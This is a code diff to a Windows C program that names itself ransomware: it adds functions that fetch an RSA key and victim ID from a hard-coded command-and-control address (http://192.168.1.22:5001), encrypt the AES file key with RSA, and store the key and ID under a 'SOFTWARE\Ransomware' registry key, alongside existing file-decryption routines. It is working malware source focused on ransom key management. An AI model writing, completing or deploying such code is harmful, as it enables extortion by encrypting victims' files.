@@ -2,6 +2,11 @@
 
 #include <stdio.h>
 #include <string.h>
+#include <winreg.h>
+#include <wininet.h>
+
+#pragma comment(lib, "wininet.lib")
+
 
 void InitializeCrypto(HCRYPTPROV *hProv, HCRYPTKEY *hAesKey, HCRYPTKEY *hRsaKey, BYTE **aesKeyBlob) {
     DWORD aesBlobLen = 0, rsaBlobLen = 0;
@@ -35,31 +40,49 @@ void InitializeCrypto(HCRYPTPROV *hProv, HCRYPTKEY *hAesKey, HCRYPTKEY *hRsaKey,
     if (CryptExportKey(*hRsaKey, 0, PRIVATEKEYBLOB, 0, NULL, &rsaBlobLen)) {
         rsaKeyBlob = (BYTE*)malloc(rsaBlobLen);
         CryptExportKey(*hRsaKey, 0, PRIVATEKEYBLOB, 0, rsaKeyBlob, &rsaBlobLen);
-        printf("RSA private key blob: ");
-        for (size_t i = 0; i < rsaBlobLen; i++) {
-            printf("%02x", rsaKeyBlob[i]);
-        }
-        printf("\n");
+        // printf("RSA private key blob: ");
+        // for (size_t i = 0; i < rsaBlobLen; i++) {
+        //     printf("%02x", rsaKeyBlob[i]);
+        // }
+        // printf("\n");
     }
     if (CryptExportKey(*hRsaKey, 0, PUBLICKEYBLOB, 0, NULL, &rsaBlobLen)) {
         rsaKeyBlob = (BYTE*)malloc(rsaBlobLen);
         CryptExportKey(*hRsaKey, 0, PUBLICKEYBLOB, 0, rsaKeyBlob, &rsaBlobLen);
-        printf("RSA public key blob: ");
-        for (size_t i = 0; i < rsaBlobLen; i++) {
-            printf("%02x", rsaKeyBlob[i]);
-        }
-        printf("\n");
+        // printf("RSA public key blob: ");
+        // for (size_t i = 0; i < rsaBlobLen; i++) {
+        //     printf("%02x", rsaKeyBlob[i]);
+        // }
+        // printf("\n");
     }
 }
 
+void SaveToRegistry(char *valueName, BYTE *data, DWORD dataLen) {
+    HKEY hKey;
+    char* path = "SOFTWARE\\Ransomware";
+    if (RegCreateKeyEx(HKEY_CURRENT_USER, path, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        if (RegSetValueEx(hKey, valueName, 0, REG_BINARY, data, dataLen) == ERROR_SUCCESS) {
+
+        } else { 
+
+        }
+    } else {
+        
+    }
+    RegCloseKey(hKey);
+}
+
 void KeyEncrypt(BYTE **key, HCRYPTKEY hKey) {
+    printf("Encrypting key\n");
     BYTE *encryptedKey = (BYTE*)malloc(256);
     DWORD encryptedKeyLen = 256;
-    DWORD keyLen = 16;
-    memcpy(encryptedKey, *key, 16);
-    if (CryptEncrypt(hKey, 0, TRUE, 0, encryptedKey, &encryptedKeyLen, keyLen)) {
+    DWORD keyLen = 28;
+    memcpy(encryptedKey, *key, 28);
+    if (CryptEncrypt(hKey, 0, TRUE, 0, encryptedKey, &keyLen, encryptedKeyLen)) {
         free(*key);
         *key = encryptedKey;
+        SaveToRegistry("EncryptedKey", *key, encryptedKeyLen);
+        printf("Encrypted key successfully\n");
     } else {
         free(encryptedKey);
     }
@@ -112,13 +135,67 @@ void HexToBytes(const char *hex, BYTE* bytes) {
     }
 }
 
+char* GetRSAKey(char *id) {
+    HINTERNET hInternet = NULL, hConnection = NULL;
+    char *fullUrl = NULL;
+    char *raw_res = (char*)malloc(16384); 
+    if (!raw_res) return NULL;
+    raw_res[0] = '\0';
+
+    size_t urlLen = strlen("http://192.168.1.22:5001/") + (id ? strlen(id) + 5 : 1);
+    fullUrl = (char*)malloc(urlLen);
+    
+    if (id) sprintf(fullUrl, "http://192.168.1.22:5001/?id=%s", id);
+    else sprintf(fullUrl, "http://192.168.1.22:5001/");
+
+    hInternet = InternetOpen("MSYS2_Client", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInternet) goto cleanup;
+
+    hConnection = InternetOpenUrl(hInternet, fullUrl, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    if (!hConnection) goto cleanup;
+
+    char buffer[2048];
+    DWORD bytesRead;
+    while (InternetReadFile(hConnection, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
+        buffer[bytesRead] = '\0';
+        strcat(raw_res, buffer);
+    }
+
+cleanup:
+    if (fullUrl) free(fullUrl);
+    if (hConnection) InternetCloseHandle(hConnection);
+    if (hInternet) InternetCloseHandle(hInternet);
+
+    if (raw_res[0] == '\0') {
+        free(raw_res);
+        return NULL;
+    }
+
+    char *colon = strchr(raw_res, ':');
+    if (colon) {
+        size_t id_len = colon - raw_res;
+        char *id_str = (char*)malloc(id_len + 1);
+        strncpy(id_str, raw_res, id_len);
+        id_str[id_len] = '\0';
+        BYTE *id_bytes = (BYTE*)malloc(id_len / 2);
+        HexToBytes(id_str, id_bytes);
+        char *key_only = strdup(colon + 1);
+        SaveToRegistry("id", id_bytes, (DWORD)(id_len / 2));
+        free(id_str);
+        free(raw_res);
+        return key_only;
+    }
+
+    return raw_res;
+}
+
 HCRYPTKEY ImportRSAPrivateKey(char *hexStr, HCRYPTPROV hProv) {
     DWORD blobLen = strlen(hexStr) / 2;
     BYTE *blobData = (BYTE*)malloc(blobLen);
     HexToBytes(hexStr, blobData);
     HCRYPTKEY hKey = 0;
     CryptImportKey(hProv, blobData, blobLen, 0, 0, &hKey);
-    SecureZeroMemory(blobData, blobLen);
+    RtlZeroMemory(blobData, blobLen);
     free(blobData);
     return hKey;
 }
@@ -129,7 +206,7 @@ HCRYPTKEY ImportRSAPublicKey(char *hexStr, HCRYPTPROV hProv) {
     HexToBytes(hexStr, blobData);
     HCRYPTKEY hKey = 0;
     CryptImportKey(hProv, blobData, blobLen, 0, CRYPT_EXPORTABLE, &hKey);
-    SecureZeroMemory(blobData, blobLen);
+    RtlZeroMemory(blobData, blobLen);
     free(blobData);
     return hKey;
 }
@@ -158,6 +235,23 @@ HCRYPTKEY ImportAESKey(char *hexStr, HCRYPTPROV hProv) {
         printf("Error importing key: %d\n", GetLastError());
         return 0;
     }
+    return hKey;
+}
+
+HCRYPTKEY ImportAESKeyFromBlob(BYTE *blob, DWORD blobLen, HCRYPTPROV hProv) {
+    HCRYPTKEY hKey = 0;
+
+    if (!blob || blobLen == 0) {
+        printf("Invalid AES blob\n");
+        return 0;
+    }
+
+    if (!CryptImportKey(hProv, blob, blobLen, 0, 0, &hKey)) {
+        printf("Import AES key failed: %d\n", GetLastError());
+        return 0;
+    }
+
+    printf("Import AES key success\n");
     return hKey;
 }
 
@@ -202,18 +296,40 @@ void FileDecrypt(char *path, HCRYPTPROV hProv, HCRYPTKEY hKey) {
     remove(path);
 }
 
+BYTE* LoadFromRegistry(char *valueName, DWORD *dataLen) {
+    HKEY hKey;
+    char* path = "SOFTWARE\\Ransomware";
+    BYTE *buffer = NULL;
+    DWORD bufferSize = 0;
+    if (RegOpenKeyEx(HKEY_CURRENT_USER, path, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        if (RegQueryValueEx(hKey, valueName, NULL, NULL, NULL, &bufferSize) == ERROR_SUCCESS) {
+            buffer = (BYTE*)malloc(bufferSize);
+            if (RegQueryValueEx(hKey, valueName, NULL, NULL, buffer, &bufferSize) == ERROR_SUCCESS) {
+                *dataLen = bufferSize;
+            }
+        }
+    }
+    return buffer;
+}
+
 void KeyDecrypt(BYTE **key, HCRYPTKEY hKey) {
     DWORD dwDataLen = 256; 
     BYTE *decryptedKey = (BYTE*)malloc(dwDataLen);
     if (decryptedKey == NULL) return;
 
     memcpy(decryptedKey, *key, 256);
-
+    
     if (CryptDecrypt(hKey, 0, TRUE, 0, decryptedKey, &dwDataLen)) {
         free(*key);
         *key = (BYTE*)realloc(decryptedKey, dwDataLen);
+        printf("Decrypted Key (Hex): ");
+        for (DWORD i = 0; i < dwDataLen; i++) {
+            printf("%02X ", (*key)[i]);
+        }
+        printf("\n");
     } else {
         free(decryptedKey);
+        printf("Key decrypted failed\n");
     }
 }
 
